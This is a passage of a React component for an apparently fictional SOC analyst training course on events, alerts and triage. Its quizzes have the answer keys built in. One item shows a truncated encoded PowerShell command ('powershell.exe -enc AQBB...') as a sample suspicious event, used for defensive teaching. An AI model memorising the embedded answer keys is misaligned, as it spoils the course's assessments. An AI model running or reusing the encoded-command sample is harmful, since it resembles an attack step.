'use client';

import React, { useState, useEffect } from 'react';
import {
  Shield,
  Clock,
  CheckCircle2,
  AlertCircle,
  Sparkles,
  ArrowRight,
  ArrowLeft,
  RotateCcw,
  Check,
  X,
  FileText,
  AlertTriangle,
  ChevronRight,
  ChevronLeft,
  Award,
  Layers,
  Laptop,
  CheckSquare,
  Square,
  Users,
  Building2,
  Workflow,
  Search,
  Activity,
  HardDrive,
  Network,
  Mail,
  Sliders,
  Terminal,
  Database,
  UserCheck,
  PhoneCall,
  Flame,
  FileCheck,
  Briefcase,
  HelpCircle,
  Eye,
  Lock,
} from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Progress } from '@/components/ui/progress';
import {
  UNIT_SHIFT_CONTEXTS,
  UNIT_2_RAW_EVENTS,
  UNIT_2_SIEM_PATTERN_EVENTS,
  UNIT_2_CASE_RECORD_PARTS,
  UNIT_3_TRIAGE_ALERTS,
  UNIT_4_CONTEXT_SCENARIOS,
  UNIT_5_SEVERITY_SCENARIOS,
  UNIT_6_ESCALATION_SCENARIOS,
  UNIT_7_DOSSIER_SECTIONS,
} from '@/data/modules/soc-triage-story-data';
import { useProgressStore } from '@/store/progress-store';
import { useAdminConfigStore } from '@/store/admin-config-store';
import { useToast } from '@/components/ui/toast-provider';
import { CourseLabLauncher } from '@/components/labs/CourseLabLauncher';

interface SocTriageStoryProps {
  unitId: string;
  currentTopicId?: string;
  onSelectTopic: (topicId: string) => void;
  onCompleteTopic: (topicId: string, xpReward: number) => void;
  onCompleteUnitAssessment?: () => void;
  onBackToOverview: () => void;
}

export function SocTriageStory({
  unitId,
  currentTopicId,
  onSelectTopic,
  onCompleteTopic,
  onCompleteUnitAssessment,
  onBackToOverview,
}: SocTriageStoryProps) {
  const { showToast } = useToast();
  const { completedTopics, completedUnits, addXP, completeUnit } = useProgressStore();
  const { xpSystemEnabled, freeNavigationEnabled, unlockedAssessments } = useAdminConfigStore();
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    setMounted(true);
  }, []);

  const shiftContext = UNIT_SHIFT_CONTEXTS[unitId] || UNIT_SHIFT_CONTEXTS['unit-2'];

  // Resolver for chapter number within current unit
  const resolveInitialChapter = (): number => {
    if (unitId === 'unit-2') {
      if (currentTopicId === 'unit-2-assessment') return 5;
      if (currentTopicId === 'topic-2-2') return 3;
      if (currentTopicId === 'topic-2-1') return 1;
      return 1;
    }
    // Units 3 to 7: each unit has 3 chapters: 1 (Framework/Theory), 2 (Hands-on Lab), 3 (Assessment)
    if (currentTopicId?.includes('assessment')) return 3;
    if (currentTopicId?.endsWith('-2')) return 2;
    return 1;
  };

  const [activeSubStep, setActiveSubStep] = useState<number>(resolveInitialChapter);

  useEffect(() => {
    if (unitId === 'unit-2') {
      if (currentTopicId === 'unit-2-assessment') {
        setActiveSubStep(5);
      } else if (currentTopicId === 'topic-2-2') {
        setActiveSubStep((prev) => (prev === 4 ? 4 : 3));
      } else if (currentTopicId === 'topic-2-1') {
        setActiveSubStep((prev) => (prev === 2 ? 2 : 1));
      } else {
        setActiveSubStep(1);
      }
    } else {
      if (currentTopicId?.includes('assessment')) {
        setActiveSubStep(3);
      } else if (currentTopicId?.endsWith('-2')) {
        setActiveSubStep(2);
      } else {
        setActiveSubStep(1);
      }
    }
  }, [currentTopicId, unitId]);

  // ==========================================================================
  // STATE MANAGEMENT PER UNIT
  // ==========================================================================

  // UNIT 2 STATES
  const [u2SingleEventAnswer, setU2SingleEventAnswer] = useState<string>('');
  const [u2EventLogChecklist, setU2EventLogChecklist] = useState<Record<number, boolean>>({});
  const [u2AlertCompareAnswer, setU2AlertCompareAnswer] = useState<string>('');
  const [u2DistinguishAnswers, setU2DistinguishAnswers] = useState<Record<number, 'event' | 'alert'>>({});
  const [u2IncidentScenarios, setU2IncidentScenarios] = useState<Record<number, string>>({});
  const [u2IncidentPredictAnswers, setU2IncidentPredictAnswers] = useState<Record<number, boolean>>({});
  const [u2BadNoteAnswer, setU2BadNoteAnswer] = useState<string>('');
  const [u2CaseAssemblyOrder, setU2CaseAssemblyOrder] = useState<string[]>([]);
  const [u2KcQ1Answer, setU2KcQ1Answer] = useState<string>('');
  const [u2KcQ2Text, setU2KcQ2Text] = useState<string>('');
  const [u2KcQ3Answer, setU2KcQ3Answer] = useState<string>('');
  const [u2KcSubmitted, setU2KcSubmitted] = useState<boolean>(false);

  // UNIT 3 STATES
  const [u3ActiveTriageAlertIndex, setU3ActiveTriageAlertIndex] = useState<number>(0);
  const [u3RevealedFields, setU3RevealedFields] = useState<Record<string, boolean>>({});
  const [u3Base64Decoded, setU3Base64Decoded] = useState<boolean>(false);
  const [u3VtHashChecked, setU3VtHashChecked] = useState<boolean>(false);
  const [u3SelectedProcessNode, setU3SelectedProcessNode] = useState<string | null>(null);
  const [u3KcQ1Answer, setU3KcQ1Answer] = useState<string>('');
  const [u3KcQ2Answer, setU3KcQ2Answer] = useState<string>('');
  const [u3KcQ3Answer, setU3KcQ3Answer] = useState<string>('');
  const [u3KcSubmitted, setU3KcSubmitted] = useState<boolean>(false);

  // UNIT 4 STATES
  const [u4ActivePillar, setU4ActivePillar] = useState<number>(1);
  const [u4PillarsReviewed, setU4PillarsReviewed] = useState<number[]>([1]);
  const [u4ContextScenarioAnswers, setU4ContextScenarioAnswers] = useState<Record<string, string>>({});
  const [u4KcQ1Answer, setU4KcQ1Answer] = useState<string>('');
  const [u4KcQ2Answer, setU4KcQ2Answer] = useState<string>('');
  const [u4KcSubmitted, setU4KcSubmitted] = useState<boolean>(false);

  // UNIT 5 STATES
  const [u5CalculatorAsset, setU5CalculatorAsset] = useState<number>(1);
  const [u5CalculatorThreat, setU5CalculatorThreat] = useState<number>(1);
  const [u5CalculatorImpact, setU5CalculatorImpact] = useState<number>(1);
  const [u5PrioritizedTickets, setU5PrioritizedTickets] = useState<string[]>([]);
  const [u5KcPrioOrder, setU5KcPrioOrder] = useState<string[]>([]);
  const [u5KcQ2Answer, setU5KcQ2Answer] = useState<string>('');
  const [u5KcSubmitted, setU5KcSubmitted] = useState<boolean>(false);

  // UNIT 6 STATES
  const [u6SelectedPathway, setU6SelectedPathway] = useState<number>(1);
  const [u6PathwaysReviewed, setU6PathwaysReviewed] = useState<number[]>([1]);
  const [u6EscalationAnswers, setU6EscalationAnswers] = useState<Record<string, string>>({});
  const [u6KcTierOrder, setU6KcTierOrder] = useState<Record<string, string>>({});
  const [u6KcQ2Answer, setU6KcQ2Answer] = useState<string>('');
  const [u6KcSubmitted, setU6KcSubmitted] = useState<boolean>(false);

  // UNIT 7 STATES
  const [u7ActiveDossierPart, setU7ActiveDossierPart] = useState<number>(1);
  const [u7DossierPartsReviewed, setU7DossierPartsReviewed] = useState<number[]>([1]);
  const [u7CheckedAuditItems, setU7CheckedAuditItems] = useState<Record<number, boolean>>({});
  const [u7GraduationCaseChoice, setU7GraduationCaseChoice] = useState<string>('case-1');
  const [u7GraduationConfirmed, setU7GraduationConfirmed] = useState<boolean>(false);
  const [u7DefenseQ1, setU7DefenseQ1] = useState<string>('');
  const [u7DefenseQ2, setU7DefenseQ2] = useState<string>('');
  const [u7DefenseQ3, setU7DefenseQ3] = useState<string>('');

  // Chapter completion tracking for lock logic (per unit)
  // Key format: `${unitId}-chapter-${chapterNum}` e.g. 'unit-2-chapter-1'
  const [completedChapters, setCompletedChapters] = useState<Set<string>>(new Set());
  const markChapterDone = (unitId: string, chapterNum: number) => {
    setCompletedChapters((prev) => new Set([...prev, `${unitId}-chapter-${chapterNum}`]));
  };
  const isChapterDone = (uid: string, chapterNum: number): boolean =>
    completedChapters.has(`${uid}-chapter-${chapterNum}`);

  // Progressive interaction checks:
  const isCh21Complete = !!u2SingleEventAnswer && Object.keys(u2EventLogChecklist).length >= 2;
  const isCh22Complete = Object.keys(u2DistinguishAnswers).length >= 4;
  const isCh23Complete = Object.keys(u2IncidentPredictAnswers).length >= 4;
  const isCh24Complete = u2CaseAssemblyOrder.length === 5;

  const isU3Ch1Complete = Object.keys(u3RevealedFields).length >= 3;
  const isU3Ch2Complete = u3Base64Decoded && u3VtHashChecked && u3SelectedProcessNode !== null;

  const isU4Ch1Complete = u4PillarsReviewed.length >= 3;
  const isU4Ch2Complete = Object.keys(u4ContextScenarioAnswers).length >= 2;

  const isU5Ch1Complete = u5CalculatorAsset > 1 || u5CalculatorThreat > 1 || u5CalculatorImpact > 1;
  const isU5Ch2Complete = u5PrioritizedTickets.length >= 2;

  const isU6Ch1Complete = u6PathwaysReviewed.length >= 2;
  const isU6Ch2Complete = Object.keys(u6EscalationAnswers).length >= 2;

  const isU7Ch1Complete = u7DossierPartsReviewed.length >= 3;
  const isU7Ch2Complete = Object.keys(u7CheckedAuditItems).length >= 3;

  const isChapterLocked = (uid: string, chapterNum: number): boolean => {
    if (!mounted || freeNavigationEnabled) return false;
    if (chapterNum <= 1) return false;

    if (uid === 'unit-2') {
      if (chapterNum === 2) return !isCh21Complete && !isChapterDone('unit-2', 1) && !completedTopics.has('topic-2-1');
      if (chapterNum === 3) return !isCh22Complete && !isChapterDone('unit-2', 2) && !completedTopics.has('topic-2-1');
      if (chapterNum === 4) return !isCh23Complete && !isChapterDone('unit-2', 3) && !completedTopics.has('topic-2-2');
      if (chapterNum === 5) return !isCh24Complete && !isChapterDone('unit-2', 4) && !(completedUnits.has('unit-2') || completedUnits.has('unit-2-assessment'));
    }
    if (uid === 'unit-3') {
      if (chapterNum === 2) return !isU3Ch1Complete && !isChapterDone('unit-3', 1) && !completedTopics.has('topic-3-1');
      if (chapterNum === 3) return !isU3Ch2Complete && !isChapterDone('unit-3', 2) && !(completedUnits.has('unit-3') || completedUnits.has('unit-3-assessment'));
    }
    if (uid === 'unit-4') {
      if (chapterNum === 2) return !isU4Ch1Complete && !isChapterDone('unit-4', 1) && !completedTopics.has('topic-4-1');
      if (chapterNum === 3) return !isU4Ch2Complete && !isChapterDone('unit-4', 2) && !(completedUnits.has('unit-4') || completedUnits.has('unit-4-assessment'));
    }
    if (uid === 'unit-5') {
      if (chapterNum === 2) return !isU5Ch1Complete && !isChapterDone('unit-5', 1) && !completedTopics.has('topic-5-1');
      if (chapterNum === 3) return !isU5Ch2Complete && !isChapterDone('unit-5', 2) && !(completedUnits.has('unit-5') || completedUnits.has('unit-5-assessment'));
    }
    if (uid === 'unit-6') {
      if (chapterNum === 2) return !isU6Ch1Complete && !isChapterDone('unit-6', 1) && !completedTopics.has('topic-6-1');
      if (chapterNum === 3) return !isU6Ch2Complete && !isChapterDone('unit-6', 2) && !(completedUnits.has('unit-6') || completedUnits.has('unit-6-assessment'));
    }
    if (uid === 'unit-7') {
      if (chapterNum === 2) return !isU7Ch1Complete && !isChapterDone('unit-7', 1) && !completedTopics.has('topic-7-1');
      if (chapterNum === 3) return !isU7Ch2Complete && !isChapterDone('unit-7', 2) && !(completedUnits.has('unit-7') || completedUnits.has('unit-7-assessment'));
    }
    return !isChapterDone(uid, chapterNum - 1);
  };

  const isUnitPillLocked = (unitNum: number, unitUid: string): boolean => {
    if (!mounted || freeNavigationEnabled) return false;
    if (unitNum <= 1 || unitUid === 'unit-1') return false;
    const prevAssessmentId = `unit-${unitNum - 1}-assessment`;
    const prevUnitId = `unit-${unitNum - 1}`;
    return !(
      completedUnits.has(prevAssessmentId) ||
      completedUnits.has(prevUnitId) ||
      unlockedAssessments?.includes?.(prevAssessmentId)
    );
  };

  // Advance topic helper
  const handleAdvance = (nextTopicId: string, currentTopicReward: number = 35) => {
    if (currentTopicId) {
      onCompleteTopic(currentTopicId, currentTopicReward);
    }
    onSelectTopic(nextTopicId);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  // Complete assessment helper
  const handleFinishAssessment = (assessmentId: string, xp: number = 100) => {
    completeUnit(unitId, 100);
    completeUnit(assessmentId, 100);
    if (xpSystemEnabled) addXP(xp);
    if (onCompleteUnitAssessment) onCompleteUnitAssessment();
    showToast({
      type: 'success',
      title: `${shiftContext.shiftTheme} Certified! 🎉`,
      description: `Outstanding work on ${shiftContext.dayTitle}! You earned +${xp} XP.`,
    });
  };

  return (
    <div className="space-y-6 max-w-5xl mx-auto pb-16 animate-fade-in font-sans">
      {/* ====================================================
          TOP UNIT SWITCHER BAR (UNITS 1 TO 7 DIRECT ACCESS)
         ==================================================== */}
      <div className="flex items-center gap-1.5 overflow-x-auto pb-2 border-b border-border/70 scrollbar-none">
        {[
          { id: 'unit-1', num: 1, label: 'Unit 1: Architecture', topicId: 'topic-1-1' },
          { id: 'unit-2', num: 2, label: 'Unit 2: Alerts & Events', topicId: 'topic-2-1' },
          { id: 'unit-3', num: 3, label: 'Unit 3: Alert Triage', topicId: 'topic-3-1' },
          { id: 'unit-4', num: 4, label: 'Unit 4: False Positives', topicId: 'topic-4-1' },
          { id: 'unit-5', num: 5, label: 'Unit 5: Severity & SLAs', topicId: 'topic-5-1' },
          { id: 'unit-6', num: 6, label: 'Unit 6: Escalation', topicId: 'topic-6-1' },
          { id: 'unit-7', num: 7, label: 'Unit 7: Documentation', topicId: 'topic-7-1' },
        ].map((u) => {
          const locked = isUnitPillLocked(u.num, u.id);
          return (
            <button
              key={u.id}
              type="button"
              onClick={() => {
                if (locked) {
                  showToast({
                    type: 'warning',
                    title: 'Unit Locked 🔒',
                    description: `Complete Unit ${u.num - 1} and pass its assessment to unlock ${u.label}.`,
                  });
                  return;
                }
                onSelectTopic(u.topicId);
              }}
              className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all whitespace-nowrap flex items-center gap-1.5 ${
                locked
                  ? 'opacity-50 cursor-not-allowed bg-muted/40 text-muted-foreground border border-border/50'
                  : unitId === u.id
                  ? 'bg-primary text-primary-foreground shadow-xs ring-1 ring-primary cursor-pointer'
                  : 'bg-card hover:bg-muted text-muted-foreground border border-border/70 hover:text-foreground cursor-pointer'
              }`}
              title={locked ? `Locked: Complete Unit ${u.num - 1} first` : u.label}
            >
              {locked ? (
                <Lock className="w-3.5 h-3.5 text-muted-foreground/80" />
              ) : (
                <span className={`w-4 h-4 rounded-full flex items-center justify-center text-[10px] ${
                  unitId === u.id ? 'bg-primary-foreground/20 text-primary-foreground font-bold' : 'bg-muted text-muted-foreground'
                }`}>
                  {u.num}
                </span>
              )}
              <span>{u.label}</span>
            </button>
          );
        })}
      </div>

      {/* ====================================================
          TOP SHIFT HEADER & CONTEXT STRIP
         ==================================================== */}
      <Card className="border-primary/20 shadow-sm bg-gradient-to-r from-card via-card to-primary/5 overflow-hidden">
        <div className="bg-primary/10 border-b border-primary/20 px-4 py-2 flex flex-wrap items-center justify-between gap-2 text-xs">
          <div className="flex items-center gap-2">
            <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-ping" />
            <span className="font-bold text-foreground uppercase tracking-wider font-mono">FinCorp SOC Ops • Live Shift</span>
            <span className="text-border">|</span>
            <span className="font-medium text-foreground">{shiftContext.dayTitle}</span>
          </div>

          <div className="flex items-center gap-3">
            <Badge variant="outline" className="bg-card font-mono text-xs gap-1 border-primary/30 text-primary">
              <Clock className="w-3.5 h-3.5 text-primary" />
              <span>Shift Time: {shiftContext.shiftTime}</span>
            </Badge>
            <Button
              variant="ghost"
              size="sm"
              onClick={onBackToOverview}
              className="h-7 text-xs text-muted-foreground hover:text-foreground"
            >
              Back to Overview
            </Button>
          </div>
        </div>

        <CardContent className="p-5 sm:p-6 space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
            <div className="space-y-1">
              <div className="flex items-center gap-2">
                <Badge className="bg-primary text-primary-foreground text-xs font-bold font-mono">
                  Unit {shiftContext.unitNumber}
                </Badge>
                <h1 className="text-xl sm:text-2xl font-extrabold text-foreground tracking-tight">
                  {shiftContext.shiftTheme}
                </h1>
              </div>
              <p className="text-xs sm:text-sm text-muted-foreground">
                {shiftContext.narrativeScenario}
              </p>
            </div>

            {/* Mentor Callout */}
            <div className="sm:max-w-xs p-3 rounded-xl bg-primary/5 border border-primary/20 text-xs space-y-1 shrink-0">
              <div className="flex items-center gap-2 font-bold text-foreground">
                <div className="w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-[10px]">
                  RK
                </div>
                <span>Rajesh Kumar (L1 Mentor)</span>
              </div>
              <p className="text-muted-foreground leading-relaxed italic">
                {shiftContext.mentorQuote}
              </p>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* ====================================================
          UNIT 2: ALERTS & EVENTS (TOPICS 2.1 TO 2.5)
         ==================================================== */}
      {unitId === 'unit-2' && (
        <div className="space-y-6">
          {/* Unit 2 Chapter Navigation — Chapter-style with locks */}
          <div className="rounded-2xl border bg-card shadow-sm overflow-hidden">
            <div className="p-2 sm:p-3 bg-card flex items-center justify-between gap-2 overflow-x-auto border-b">
              <div className="flex items-center gap-1 sm:gap-2">
                {[
                  { num: 1, label: '1. Raw Events', topicId: 'topic-2-1' },
                  { num: 2, label: '2. Events vs Alerts', topicId: 'topic-2-1' },
                  { num: 3, label: '3. Alert vs Incident', topicId: 'topic-2-2' },
                  { num: 4, label: '4. Incident vs Case', topicId: 'topic-2-2' },
                  { num: 5, label: '5. Unit Assessment', topicId: 'unit-2-assessment' },
                ].map((tab) => {
                  const isActive = activeSubStep === tab.num || (tab.num === 5 && currentTopicId === 'unit-2-assessment');
                  const isDone = isChapterDone('unit-2', tab.num) || (mounted && (
                    tab.num === 5
                      ? completedUnits.has('unit-2') || completedUnits.has('unit-2-assessment')
                      : false
                  ));
                  const locked = isChapterLocked('unit-2', tab.num);
                  return (
                    <button
                      key={tab.num}
                      type="button"
                      suppressHydrationWarning
                      onClick={() => {
                        if (locked) {
                          showToast({
                            type: 'warning',
                            title: 'Chapter Locked 🔒',
                            description: 'Complete the interactive exercises in the previous chapter to unlock this one.',
                          });
                          return;
                        }
                        setActiveSubStep(tab.num);
                        onSelectTopic(tab.topicId);
                      }}
                      className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all whitespace-nowrap flex items-center gap-1.5 ${
                        isActive
                          ? 'bg-primary text-primary-foreground shadow-xs'
                          : isDone
                          ? 'bg-emerald-50 text-emerald-800 hover:bg-emerald-100 border border-emerald-300'
                          : locked
                          ? 'opacity-60 cursor-not-allowed text-muted-foreground border border-border/60'
                          : 'hover:bg-muted text-muted-foreground border border-border/60'
                      }`}
                    >
                      {isDone ? (
                        <CheckCircle2 className="w-3 h-3 text-emerald-600" />
                      ) : locked ? (
                        <Lock className="w-3 h-3 text-muted-foreground/60" />
                      ) : null}
                      <span>{tab.label}</span>
                    </button>
                  );
                })}
              </div>
              <div className="hidden md:flex items-center gap-2 shrink-0 text-xs text-muted-foreground font-mono">
                <span>Chapter {activeSubStep} of 5</span>
              </div>
            </div>
          </div>

          {/* Topic 2.1: Understanding Events */}
          {activeSubStep === 1 && (
            <Card className="shadow-xs border-border">
              <CardHeader className="pb-3 border-b bg-muted/20">
                <div className="flex items-center justify-between">
                  <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                    <HardDrive className="w-4 h-4 text-primary" />
                    Chapter 2.1: Understanding Events (The Smallest Unit of Data)
                  </CardTitle>
                  <Badge variant="outline" className="text-xs font-mono">Raw Log Inspector</Badge>
                </div>
              </CardHeader>
              <CardContent className="p-5 sm:p-6 space-y-6">
                <div className="p-4 rounded-xl bg-slate-950 text-slate-200 border border-slate-800 space-y-3 font-mono text-xs">
                  <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                    <span className="text-sky-400 font-bold">EDR RAW EVENT LOG — FIN-BOS-MCHEN-047</span>
                    <span className="text-slate-500">Host Status: Active</span>
                  </div>
                  <div className="space-y-2.5 max-h-56 overflow-y-auto pr-1">
                    {UNIT_2_RAW_EVENTS.map((ev) => (
                      <div key={ev.id} className="p-2.5 rounded bg-slate-900/80 border border-slate-800 text-[11px] space-y-0.5">
                        <div className="flex justify-between text-sky-300 font-bold">
                          <span>EVENT {ev.id}: {ev.type}</span>
                          <span className="text-slate-400 font-normal">{ev.time}</span>
                        </div>
                        <p className="text-slate-300 font-sans">{ev.details}</p>
                        <p className="text-slate-500 text-[10px]">User: {ev.user} | Host: {ev.host}</p>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Question on Single Event */}
                <div className="p-4 rounded-xl border bg-card space-y-3">
                  <span className="text-xs font-bold text-primary block uppercase tracking-wider font-mono">
                    Rajesh Asks: Is this single event by itself suspicious?
                  </span>
                  <div className="p-3 rounded-lg bg-muted/40 font-mono text-xs space-y-1">
                    <p className="text-foreground">Type: Process Execution | Program: powershell.exe -enc AQBB...</p>
                    <p className="text-muted-foreground">User: svc_backup | Host: FIN-BOS-SERVER-DB01 | Time: 14:30:15</p>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 pt-1 text-xs">
                    {[
                      { id: 'A', text: 'A) Yes, PowerShell is always suspicious' },
                      { id: 'B', text: 'B) No, it is a single event. I am not knowing yet without context.' },
                      { id: 'C', text: 'C) Yes, encoded command is definitely malware' },
                      { id: 'D', text: 'D) No, service accounts always run PowerShell without risk' },
                    ].map((opt) => (
                      <button
                        key={opt.id}
                        onClick={() => setU2SingleEventAnswer(opt.id)}
                        className={`p-3 rounded-lg border text-left transition-all ${
                          u2SingleEventAnswer === opt.id
                            ? opt.id === 'B'
                              ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold'
                              : 'bg-rose-50 border-rose-500 text-rose-950'
                            : 'bg-card hover:bg-muted border-border text-foreground'
                        }`}
                      >
                        {opt.text}
                      </button>
                    ))}
                  </div>

                  {u2SingleEventAnswer && (
                    <div className="p-3 rounded-lg bg-primary/5 border border-primary/20 text-xs space-y-1 animate-fade-in">
                      <span className="font-bold text-primary">Rajesh Explains:</span>
                      <p className="text-muted-foreground leading-relaxed">
                        &ldquo;Correct, yaar! One event is just one single action recorded by one tool. It might be an admin script, or it might be malware. You cannot make a judgment on one event alone. This is why we have alerts.&rdquo;
                      </p>
                    </div>
                  )}
                </div>

                {/* Interactive Challenge: Identify Events in Raw Logs */}
                <div className="p-4 rounded-xl border bg-card space-y-3">
                  <div className="flex items-center justify-between">
                    <div>
                      <h4 className="text-xs font-bold text-foreground">Interactive Challenge: Identify Real Events (Raw Actions vs Interpretations)</h4>
                      <p className="text-[11px] text-muted-foreground">Check only the items that represent actual, objective raw log events.</p>
                    </div>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => setU2EventLogChecklist({})}
                      className="text-xs gap-1 h-7"
                    >
                      <RotateCcw className="w-3 h-3" />
                      Reset Challenge
                    </Button>
                  </div>

                  <div className="space-y-2 text-xs">
                    {[
                      { id: 1, text: 'Item 1: "User mchen logged in at 09:15 AM via Kerberos"', isEvent: true },
                      { id: 2, text: 'Item 2: "Registry modified: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"', isEvent: true },
                      { id: 3, text: 'Item 3: "Attack happened with dangerous macro malware"', isEvent: false },
                      { id: 4, text: 'Item 4: "File C:\\temp\\sketch.tmp created by explorer.exe"', isEvent: true },
                      { id: 5, text: 'Item 5: "Email was malicious phishing lure"', isEvent: false },
                    ].map((item) => (
                      <div
                        key={item.id}
                        onClick={() => setU2EventLogChecklist((prev) => ({ ...prev, [item.id]: !prev[item.id] }))}
                        className={`p-2.5 rounded-lg border flex items-center justify-between cursor-pointer transition-all ${
                          u2EventLogChecklist[item.id]
                            ? item.isEvent
                              ? 'bg-emerald-50/50 border-emerald-300 text-emerald-950 font-semibold'
                              : 'bg-rose-50/50 border-rose-300 text-rose-950'
                            : 'bg-card hover:bg-muted border-border'
                        }`}
                      >
                        <div className="flex items-center gap-2">
                          {u2EventLogChecklist[item.id] ? <CheckSquare className="w-4 h-4 text-primary" /> : <Square className="w-4 h-4 text-muted-foreground" />}
                          <span>{item.text}</span>
                        </div>
                        {u2EventLogChecklist[item.id] && (
                          <Badge variant="outline" className={item.isEvent ? 'text-emerald-700 bg-emerald-50 text-[10px]' : 'text-rose-700 bg-rose-50 text-[10px]'}>
                            {item.isEvent ? '✓ Real Event (Action)' : '✗ Analysis/Conclusion'}
                          </Badge>
                        )}
                      </div>
                    ))}
                  </div>
                </div>

                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-2">
                  {!isCh21Complete && !isChapterDone('unit-2', 1) && !freeNavigationEnabled ? (
                    <span className="text-amber-600 dark:text-amber-400 text-xs font-semibold flex items-center gap-1.5">
                      <Lock className="w-3.5 h-3.5" />
                      Answer Rajesh&apos;s question and check items in the Event Challenge above to unlock Chapter 2.2
                    </span>
                  ) : <div />}
                  <Button
                    disabled={!isCh21Complete && !isChapterDone('unit-2', 1) && !freeNavigationEnabled}
                    onClick={() => {
                      markChapterDone('unit-2', 1);
                      setActiveSubStep(2);
                      onCompleteTopic('topic-2-1', 25);
                      window.scrollTo({ top: 0, behavior: 'smooth' });
                    }}
                    className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span>Advance to Chapter 2.2: Understanding Alerts</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Chapter 2.2: Understanding Alerts */}
          {activeSubStep === 2 && (
            <Card className="shadow-xs border-border">
              <CardHeader className="pb-3 border-b bg-muted/20">
                <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                  <Activity className="w-4 h-4 text-primary" />
                  Chapter 2.2: Understanding Alerts (Pattern Recognition in SIEM)
                </CardTitle>
              </CardHeader>
              <CardContent className="p-5 sm:p-6 space-y-6">
                <div className="p-4 rounded-xl bg-slate-950 text-slate-100 border border-slate-800 space-y-3 font-mono text-xs">
                  <span className="text-sky-400 font-bold block border-b border-slate-800 pb-2">
                    SIEM CORRELATION: How 3 Events Form Alert SEC-2026-0412
                  </span>
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5 pt-1">
                    {UNIT_2_SIEM_PATTERN_EVENTS.map((pe) => (
                      <div key={pe.id} className="p-3 rounded-lg bg-slate-900 border border-slate-800 space-y-1">
                        <span className="text-[10px] text-amber-400 font-bold block">{pe.name}</span>
                        <p className="text-white text-xs">{pe.tool}</p>
                        <p className="text-slate-400 text-[11px] font-sans">{pe.detail}</p>
                      </div>
                    ))}
                  </div>
                  <div className="p-3 rounded-lg bg-sky-950/40 border border-sky-800 text-sky-200 text-xs font-sans italic">
                    Rajesh: &ldquo;See? One event is just PowerShell running. But three events together within 2 seconds—Word spawned PowerShell, PowerShell called malware IP, firewall blocked it—that is an attack pattern. That is an alert!&rdquo;
                  </div>
                </div>

                {/* Distinguish Events from Alerts Challenge */}
                <div className="p-4 rounded-xl border bg-card space-y-3">
                  <div className="flex items-center justify-between">
                    <div>
                      <h4 className="text-xs font-bold text-foreground">Interactive Challenge: Distinguish Raw Events vs. Correlated Alerts</h4>
                      <p className="text-[11px] text-muted-foreground">Classify each of the 5 operational outputs below.</p>
                    </div>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => setU2DistinguishAnswers({})}
                      className="text-xs gap-1 h-7"
                    >
                      <RotateCcw className="w-3 h-3" />
                      Reset Challenge
                    </Button>
                  </div>

                  <div className="space-y-2 text-xs">
                    {[
                      { id: 1, text: 'jsmith downloaded file from SharePoint at 10:30 AM (Status: Normal)', correct: 'event' },
                      { id: 2, text: 'Phishing email + Executable run + Persistence key added -> Alert SEC-2026-0893', correct: 'alert' },
                      { id: 3, text: 'Service account svc_backup completed scheduled database backup job at 02:15 AM', correct: 'event' },
                      { id: 4, text: '48 Failed Logins in 60 seconds followed by domain account lockout -> Alert SEC-2026-0894', correct: 'alert' },
                      { id: 5, text: 'User opened PDF invoice in Acrobat Reader at 12:00 PM', correct: 'event' },
                    ].map((item) => (
                      <div key={item.id} className="p-3 rounded-lg border bg-muted/20 flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                        <span className="font-medium text-foreground">{item.text}</span>
                        <div className="flex items-center gap-1.5 shrink-0">
                          <button
                            onClick={() => setU2DistinguishAnswers((prev) => ({ ...prev, [item.id]: 'event' }))}
                            className={`px-3 py-1 rounded text-xs font-bold border transition-all ${
                              u2DistinguishAnswers[item.id] === 'event'
                                ? item.correct === 'event'
                                  ? 'bg-emerald-600 text-white border-emerald-600'
                                  : 'bg-rose-600 text-white border-rose-600'
                                : 'bg-card hover:bg-muted text-muted-foreground'
                            }`}
                          >
                            Single Event
                          </button>
                          <button
                            onClick={() => setU2DistinguishAnswers((prev) => ({ ...prev, [item.id]: 'alert' }))}
                            className={`px-3 py-1 rounded text-xs font-bold border transition-all ${
                              u2DistinguishAnswers[item.id] === 'alert'
                                ? item.correct === 'alert'
                                  ? 'bg-emerald-600 text-white border-emerald-600'
                                  : 'bg-rose-600 text-white border-rose-600'
                                : 'bg-card hover:bg-muted text-muted-foreground'
                            }`}
                          >
                            Alert (Pattern)
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-2">
                  {!isCh22Complete && !isChapterDone('unit-2', 2) && !freeNavigationEnabled ? (
                    <span className="text-amber-600 dark:text-amber-400 text-xs font-semibold flex items-center gap-1.5">
                      <Lock className="w-3.5 h-3.5" />
                      Classify all items as Single Event or Alert ({Object.keys(u2DistinguishAnswers).length}/4) to unlock Chapter 2.3
                    </span>
                  ) : <div />}
                  <Button
                    disabled={!isCh22Complete && !isChapterDone('unit-2', 2) && !freeNavigationEnabled}
                    onClick={() => {
                      markChapterDone('unit-2', 2);
                      setActiveSubStep(3);
                      onCompleteTopic('topic-2-1', 25);
                      onSelectTopic('topic-2-2');
